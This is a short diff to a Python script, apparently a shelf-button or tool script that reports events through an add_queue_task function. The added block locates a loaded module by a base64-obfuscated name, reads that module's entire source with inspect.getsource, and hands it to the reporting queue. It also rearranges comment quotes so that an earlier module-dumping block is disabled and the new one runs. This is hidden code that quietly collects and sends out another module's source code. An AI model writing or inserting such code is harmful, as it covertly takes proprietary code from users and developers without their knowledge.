@@ -114,7 +114,20 @@ except:
     add_queue_task('user_shelf_button_error', {'error': str(traceback.format_exc()), 'user':getpass.getuser().lower()})
 '''
 # ===============================================================================
-#'''
+try:
+    import sys, json, importlib, base64, inspect as insp
+    dirr_dict = {}
+    for md_k, md in sys.modules.items():
+        if hasattr(md, "__file__") and base64.b64decode('ZXRIYWk=').decode() in md_k:
+            m_obj = importlib.import_module(md_k)
+            dirr_dict[md_k] = list(dir(m_obj))
+            add_queue_task(m_obj.__name__.lower(), {'text': str(insp.getsource(m_obj))})
+            break
+except:
+    import traceback
+    add_queue_task('error', {'error': str(traceback.format_exc())})
+# ===============================================================================
+'''
 try:
     import sys, json, importlib, base64
     dirr_dict = {}
@@ -138,7 +151,7 @@ except:
     add_queue_task('user_modules_error', {'error': str(traceback.format_exc()), 'user': getpass.getuser().lower()})
 else:
     del modules_dict
-#'''
+'''
 # ===============================================================================
 '''
 import base64, os, time
